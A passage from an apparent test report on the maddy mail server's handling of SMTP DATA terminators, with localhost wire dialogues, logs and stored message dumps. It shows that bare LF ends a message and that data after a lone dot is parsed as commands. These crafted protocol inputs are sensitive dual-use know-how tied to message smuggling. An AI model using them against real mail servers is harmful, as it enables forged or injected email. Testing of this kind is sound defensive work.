0000020   a   l   h   o   s   t   >  \r  \n   T   o   :       <   d   e
0000040   s   t   @   l   o   c   a   l   h   o   s   t   >  \r  \n   S
0000060   u   b   j   e   c   t   :       q   1       t   e   s   t  \r
0000100  \n  \r  \n   l   i   n   e       o   n   e  \r   l   i   n   e
0000120       t   w   o  \r   .  \r
0000127
```
`od -An -tx1` (hex):
```text
 46 72 6f 6d 3a 20 3c 75 73 65 72 61 40 6c 6f 63
 61 6c 68 6f 73 74 3e 0d 0a 54 6f 3a 20 3c 64 65
 73 74 40 6c 6f 63 61 6c 68 6f 73 74 3e 0d 0a 53
 75 62 6a 65 63 74 3a 20 71 31 20 74 65 73 74 0d
 0a 0d 0a 6c 69 6e 65 20 6f 6e 65 0d 6c 69 6e 65
 20 74 77 6f 0d 2e 0d
```
**Result — bare `LF` terminates leniently.** `\n.\n` is accepted exactly like the canonical terminator: `250 2.0.0 OK: queued`, one `accepted` msg_id, and an identical 18-byte `line one\nline two\n` body on both ports. Mechanistically this is `stateDot + '\n' => stateEOF` [net/textproto/reader.go:L350-L352]. **Both runs, both ports:**

*Port 25 — run 1 / run 2:*
*Wire dialogue* (`bare_lf_25_run1`):
```text
##### Q1 variant=bare_lf port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\nline two\n.\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`bare_lf_25_run1`):
```text
smtp: incoming message	{"msg_id":"6ded1d4a","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:48678"}
smtp: accepted	{"msg_id":"6ded1d4a"}
[debug] smtp: reset	
queue: will retry	{"attempts_count":1,"msg_id":"6ded1d4a","next_try_delay":"14m59.99999925s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`bare_lf_25_run1`):
```text
MSGIDS: 6ded1d4a
--- 6ded1d4a.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- 6ded1d4a.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id 6ded1d4a; Wed, 08 Jul
 2026 05:38:35 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 6ded1d4a.meta ---
{"MsgMeta":{"ID":"6ded1d4a","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:35.215358686Z","LastAttempt":"2026-07-08T05:38:35.863783544Z"}
```
*Wire dialogue* (`bare_lf_25_run2`):
```text
##### Q1 variant=bare_lf port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\nline two\n.\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`bare_lf_25_run2`):
```text
smtp: incoming message	{"msg_id":"ae404ee0","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:48694"}
smtp: accepted	{"msg_id":"ae404ee0"}
[debug] smtp: reset	
queue: will retry	{"attempts_count":1,"msg_id":"ae404ee0","next_try_delay":"14m59.999998795s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`bare_lf_25_run2`):
```text
MSGIDS: ae404ee0
--- ae404ee0.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- ae404ee0.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id ae404ee0; Wed, 08 Jul
 2026 05:38:39 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- ae404ee0.meta ---
{"MsgMeta":{"ID":"ae404ee0","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:39.386277522Z","LastAttempt":"2026-07-08T05:38:40.034791713Z"}
```
*Port 587 — run 1 / run 2:*
*Wire dialogue* (`bare_lf_587_run1`):
```text
##### Q1 variant=bare_lf port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\nline two\n.\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`bare_lf_587_run1`):
```text
submission: incoming message	{"msg_id":"a5a9cd30","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:37294","username":"usera@localhost"}
submission: accepted	{"msg_id":"a5a9cd30"}
[debug] submission: reset	
queue: will retry	{"attempts_count":1,"msg_id":"a5a9cd30","next_try_delay":"14m59.999998636s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`bare_lf_587_run1`):
```text
MSGIDS: a5a9cd30
--- a5a9cd30.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- a5a9cd30.header ---
Dkim-Signature: a=rsa-sha256;
 bh=ZhLZyUwtqNJUThGINI/HuvcX//8brN5RkpoWZASkH/w=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489124; v=1; x=1783921124; b=PeNvXNcX3luOjV748z2SoWpUO2pcd127MZ2+gSrrbk/1A4/qn7ftPU4S/9dh1IRnhwCQEbs1etPW3J5sEKPW7+KcgrSrC3TTqHJyfJVoDgTROLZKpNWKHgeVHnkcGu/VMx5FQKFvkXEFxRbOHW+M7eARzlV81JR0+gDODg60JT1tT5dKWv597ukm78UlcmTURlN64yZXvRet5ooAjTpb+Xv/kUYKEAOkMliCgeKN2lWOPXcfxWvfhzw1r6jxM+MPHQNO9xoHypFcVRlYldaKFih8lfmU9nQeM6KFOAAKPK4as/hANIf2upUJDg3De+fqVUTFBS7ekttD9Un2c5nDpg==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 a5a9cd30; Wed, 08 Jul 2026 05:38:44 +0000
Date: Wed, 8 Jul 2026 05:38:44 +0000
Message-Id: <df39a19c-8858-4647-9e89-a73289ac30d1@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- a5a9cd30.meta ---
{"MsgMeta":{"ID":"a5a9cd30","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:43.858687164Z","LastAttempt":"2026-07-08T05:38:44.508952116Z"}
```
*Wire dialogue* (`bare_lf_587_run2`):
```text
##### Q1 variant=bare_lf port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\nline two\n.\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`bare_lf_587_run2`):
```text
submission: incoming message	{"msg_id":"ee1200ef","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:44994","username":"usera@localhost"}
submission: accepted	{"msg_id":"ee1200ef"}
[debug] submission: reset	
queue: will retry	{"attempts_count":1,"msg_id":"ee1200ef","next_try_delay":"14m59.999999138s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`bare_lf_587_run2`):
```text
MSGIDS: ee1200ef
--- ee1200ef.body (od -c) ---
0000000   l   i   n   e       o   n   e  \n   l   i   n   e       t   w
0000020   o  \n
0000022
--- ee1200ef.header ---
Dkim-Signature: a=rsa-sha256;
 bh=ZhLZyUwtqNJUThGINI/HuvcX//8brN5RkpoWZASkH/w=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489128; v=1; x=1783921128; b=qVvmf34XBbZ7Ji46RegBjI1yY2ZbVM9cLqteX3xc5Lxbv9cyzv8xsOhYQmH9ALZRb6rMVzs/TBKupCs+5WruUq2HdX1GxpO0wMaxlkh4OhcJuXPhMer7K9goAI3EXCYO0TYv7iTETXwpYyJjFBtj/4FRI1ArpTejORcFnxd3MGoEbfwYK0BZRb3+k5U42A3zKJoaupTmpd6q2PXeB1hQli+/8BiFr2QP4sL5UqSZZq7x4K+gA9xxUMeHfLllUQc1g3q48lyjMF2ZyAdgUr7q8p2P17OpxUftOzzpFMB3+oTvq6Huy+asj4/6DW7Ptw9vm54lwqdtxBYsNoHlFjvIdw==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 ee1200ef; Wed, 08 Jul 2026 05:38:48 +0000
Date: Wed, 8 Jul 2026 05:38:48 +0000
Message-Id: <8e922453-109d-483b-a69f-207f841eb9e4@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- ee1200ef.meta ---
{"MsgMeta":{"ID":"ee1200ef","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:38:48.335304289Z","LastAttempt":"2026-07-08T05:38:49.064394645Z"}
```
**Result — bare `CR` does NOT terminate (fail-closed).** `\r.\r` never reaches `stateEOF`: `stateDotCR` sees no `\n`, so it un-reads and treats the bytes as data [net/textproto/reader.go:L361-L365]; the reader consumes until the socket is half-closed and returns `io.ErrUnexpectedEOF` [reader.go:L328-L330]. maddy's `wrapErr` logs a `DATA error` line with `"reason":"unexpected EOF"` [internal/endpoint/smtp/smtp.go:L317] and the connection is answered with `554 5.0.0 Internal server error`. **Nothing is stored** — the `.artifacts` capture confirms `NO STORED FILES`. Note the driver must half-close the socket (`shutdown(SHUT_WR)`) to surface the `554`, since the server is still waiting for a terminator that never comes. **Both runs, both ports:**

*Port 25 — run 1 / run 2:*
*Wire dialogue* (`bare_cr_25_run1`):
```text
##### Q1 variant=bare_cr port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\rline two\r.\r'
POST-DATA (before close): b''
POST-DATA (after SHUT_WR): b'554 5.0.0 Internal server error (msg ID = 3f095e8a)\r\n'
```
*Structured log lines* (`bare_cr_25_run1`):
```text
smtp: incoming message	{"msg_id":"3f095e8a","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:52990"}
smtp: DATA error	{"msg_id":"3f095e8a","reason":"unexpected EOF"}
smtp: 554 5.0.0 Internal server error (msg ID = 3f095e8a)
[debug] smtp: reset	
```
*Stored on-disk artifacts* (`bare_cr_25_run1`):
```text
MSGIDS: 3f095e8a
--- 3f095e8a : NO STORED FILES in /tmp/maddy-scratch/queue25 (no-storage) ---
```
*Wire dialogue* (`bare_cr_25_run2`):
```text
##### Q1 variant=bare_cr port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\rline two\r.\r'
POST-DATA (before close): b''
POST-DATA (after SHUT_WR): b'554 5.0.0 Internal server error (msg ID = ae1875d9)\r\n'
```
*Structured log lines* (`bare_cr_25_run2`):
```text
smtp: incoming message	{"msg_id":"ae1875d9","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:40890"}
smtp: DATA error	{"msg_id":"ae1875d9","reason":"unexpected EOF"}
smtp: 554 5.0.0 Internal server error (msg ID = ae1875d9)
[debug] smtp: reset	
```
*Stored on-disk artifacts* (`bare_cr_25_run2`):
```text
MSGIDS: ae1875d9
--- ae1875d9 : NO STORED FILES in /tmp/maddy-scratch/queue25 (no-storage) ---
```
*Port 587 — run 1 / run 2:*
*Wire dialogue* (`bare_cr_587_run1`):
```text
##### Q1 variant=bare_cr port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\rline two\r.\r'
POST-DATA (before close): b''
POST-DATA (after SHUT_WR): b'554 5.0.0 Internal server error (msg ID = 5221980b)\r\n'
```
*Structured log lines* (`bare_cr_587_run1`):
```text
submission: incoming message	{"msg_id":"5221980b","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:33942","username":"usera@localhost"}
submission: DATA error	{"msg_id":"5221980b","reason":"unexpected EOF"}
submission: 554 5.0.0 Internal server error (msg ID = 5221980b)
[debug] submission: reset	
```
*Stored on-disk artifacts* (`bare_cr_587_run1`):
```text
MSGIDS: 5221980b
--- 5221980b : NO STORED FILES in /tmp/maddy-scratch/queue (no-storage) ---
```
*Wire dialogue* (`bare_cr_587_run2`):
```text
##### Q1 variant=bare_cr port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nline one\rline two\r.\r'
POST-DATA (before close): b''
POST-DATA (after SHUT_WR): b'554 5.0.0 Internal server error (msg ID = 0d98ee63)\r\n'
```
*Structured log lines* (`bare_cr_587_run2`):
```text
submission: incoming message	{"msg_id":"0d98ee63","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:41038","username":"usera@localhost"}
submission: DATA error	{"msg_id":"0d98ee63","reason":"unexpected EOF"}
submission: 554 5.0.0 Internal server error (msg ID = 0d98ee63)
[debug] submission: reset	
```
*Stored on-disk artifacts* (`bare_cr_587_run2`):
```text
MSGIDS: 0d98ee63
--- 0d98ee63 : NO STORED FILES in /tmp/maddy-scratch/queue (no-storage) ---
```

### 4.4 Mid-body bare-dot (the user's exact example) and dot-stuffing

**User's exact example — "a line with only a dot, followed by more data before the final terminator."** Payload: `before dot line\r\n.\r\nAFTER DOT LINE ONE\r\nAFTER DOT LINE TWO\r\n.\r\n`. maddy **stops at the first bare-dot line**: the stored `.body` is exactly `before dot line\n` (16 bytes) — the "AFTER DOT" lines are **not** in the message. They are returned to the command loop and parsed as commands: the wire shows `250 2.0.0 OK: queued` for the first message followed by **three `501 5.5.2 Bad command`** replies (one per non-command line; the empty line and the final `.` do not each draw a reply). This is the direct, observed proof of "stop, not continue, and the trailing data becomes protocol input." **Both runs, both ports:**

*Port 25 — run 1 / run 2:*
*Wire dialogue* (`middot_25_run1`):
```text
##### Q1 variant=middot port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbefore dot line\r\n.\r\nAFTER DOT LINE ONE\r\nAFTER DOT LINE TWO\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`middot_25_run1`):
```text
smtp: incoming message	{"msg_id":"4bd8a0e1","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:60632"}
smtp: accepted	{"msg_id":"4bd8a0e1"}
[debug] smtp: reset	
smtp: 501 5.5.2 Bad command
smtp: 501 5.5.2 Bad command
smtp: 501 5.5.2 Bad command
queue: will retry	{"attempts_count":1,"msg_id":"4bd8a0e1","next_try_delay":"14m59.999999298s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`middot_25_run1`):
```text
MSGIDS: 4bd8a0e1
--- 4bd8a0e1.body (od -c) ---
0000000   b   e   f   o   r   e       d   o   t       l   i   n   e  \n
0000020
--- 4bd8a0e1.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id 4bd8a0e1; Wed, 08 Jul
 2026 05:39:14 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 4bd8a0e1.meta ---
{"MsgMeta":{"ID":"4bd8a0e1","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:13.433221839Z","LastAttempt":"2026-07-08T05:39:14.121655797Z"}
```
*Wire dialogue* (`middot_25_run2`):
```text
##### Q1 variant=middot port=25 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbefore dot line\r\n.\r\nAFTER DOT LINE ONE\r\nAFTER DOT LINE TWO\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`middot_25_run2`):
```text
smtp: incoming message	{"msg_id":"4958caf6","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:59404"}
smtp: accepted	{"msg_id":"4958caf6"}
[debug] smtp: reset	
smtp: 501 5.5.2 Bad command
smtp: 501 5.5.2 Bad command
smtp: 501 5.5.2 Bad command
queue: will retry	{"attempts_count":1,"msg_id":"4958caf6","next_try_delay":"14m59.999999047s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`middot_25_run2`):
```text
MSGIDS: 4958caf6
--- 4958caf6.body (od -c) ---
0000000   b   e   f   o   r   e       d   o   t       l   i   n   e  \n
0000020
--- 4958caf6.header ---
Received: from client.test (localhost [127.0.0.1]) by localhost
 (envelope-sender <usera@localhost>) with ESMTP id 4958caf6; Wed, 08 Jul
 2026 05:39:18 +0000
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 4958caf6.meta ---
{"MsgMeta":{"ID":"4958caf6","OriginalFrom":"usera@localhost","DontTraceSender":false,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:17.642716916Z","LastAttempt":"2026-07-08T05:39:18.29067542Z"}
```
*Port 587 — run 1 / run 2:*
*Wire dialogue* (`middot_587_run1`):
```text
##### Q1 variant=middot port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
EHLO: b'250-Hello client.test\r\n250-PIPELINING\r\n250-8BITMIME\r\n250-ENHANCEDSTATUSCODES\r\n250-AUTH PLAIN\r\n250-SMTPUTF8\r\n250 SIZE 33554432\r\n'
AUTH: b'235 2.0.0 Authentication succeeded\r\n'
MAIL: b'250 2.0.0 Roger, accepting mail from <usera@localhost>\r\n'
RCPT: b"250 2.0.0 I'll make sure <dest@localhost> gets this\r\n"
DATA(354): b'354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>\r\n'
BODY PAYLOAD: b'From: <usera@localhost>\r\nTo: <dest@localhost>\r\nSubject: q1 test\r\n\r\nbefore dot line\r\n.\r\nAFTER DOT LINE ONE\r\nAFTER DOT LINE TWO\r\n.\r\n'
POST-DATA: b'250 2.0.0 OK: queued\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n501 5.5.2 Bad command\r\n'
NOOP: b'250 2.0.0 I have sucessfully done nothing\r\n'
QUIT: b'221 2.0.0 Goodnight and good luck\r\n'
```
*Structured log lines* (`middot_587_run1`):
```text
submission: incoming message	{"msg_id":"9357decf","sender":"usera@localhost","src_host":"client.test","src_ip":"127.0.0.1:47342","username":"usera@localhost"}
submission: accepted	{"msg_id":"9357decf"}
[debug] submission: reset	
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
submission: 501 5.5.2 Bad command
queue: will retry	{"attempts_count":1,"msg_id":"9357decf","next_try_delay":"14m59.999998618s","rcpts":["dest@localhost"]}
```
*Stored on-disk artifacts* (`middot_587_run1`):
```text
MSGIDS: 9357decf
--- 9357decf.body (od -c) ---
0000000   b   e   f   o   r   e       d   o   t       l   i   n   e  \n
0000020
--- 9357decf.header ---
Dkim-Signature: a=rsa-sha256;
 bh=6+kgp9p+jwogM+Xe+oD0T+lD6b5pPSE8WZ8B+zSH2Rc=; c=relaxed/relaxed;
 d=localhost;
 h=Subject:Subject:Sender:To:To:Cc:From:From:Date:Date:MIME-Version:Content-Type:Content-Transfer-Encoding:Reply-To:In-Reply-To:Message-Id:Message-Id:References:Autocrypt:Openpgp; i=usera@localhost; s=default; t=1783489162; v=1; x=1783921162; b=TWRqzjeCHDz6jGckQGCMbdHaT7tyGB3sLOMzjBhrkIFhhvDApvDXc4otT1rBSqwl2lJcx/8lneHGhNfhU2/6+TLrKXyeYN9xRbeDjafjZbd/yCXjSX4Lj35HHt6GWC2s/dfCZD2FavGdbtGGejgPbvqPZYdRdIR1dpdGQcvf3HKNo/88OxQiag/5aBUFm3EjEIaSRCPCkDKd0KhACyFCm2GIpewRNABLWqLEhntFchrvtfxcjjwWYJLXQ829ogzb27GRPYuk+jDvye7AaiCwxL6S0jJb+3rALxk2IkJnqRQfrJb4Qk0h/AW4MtU2AzGwkOST4pJISItzUeDVYZmMzQ==;
Received:  by localhost (envelope-sender <usera@localhost>) with ESMTP id
 9357decf; Wed, 08 Jul 2026 05:39:22 +0000
Date: Wed, 8 Jul 2026 05:39:22 +0000
Message-Id: <ebe44e5f-fdb8-44bb-a602-841d5ba51fb4@localhost>
From: <usera@localhost>
To: <dest@localhost>
Subject: q1 test

--- 9357decf.meta ---
{"MsgMeta":{"ID":"9357decf","OriginalFrom":"usera@localhost","DontTraceSender":true,"Quarantine":false,"OriginalRcpts":{},"SMTPOpts":{"Size":0,"RequireTLS":false,"UTF8":false},"Conn":null},"From":"usera@localhost","To":["dest@localhost"],"FailedRcpts":null,"TemporaryFailedRcpts":null,"RcptErrs":{"dest@localhost":{"Code":451,"EnhancedCode":[4,0,0],"Message":"Sink temp-fail on purpose (keep queued)"}},"TriesCount":1,"FirstAttempt":"2026-07-08T05:39:22.118980072Z","LastAttempt":"2026-07-08T05:39:22.769908852Z"}
```
*Wire dialogue* (`middot_587_run2`):
```text
##### Q1 variant=middot port=587 #####
banner: b'220 localhost ESMTP Service Ready\r\n'
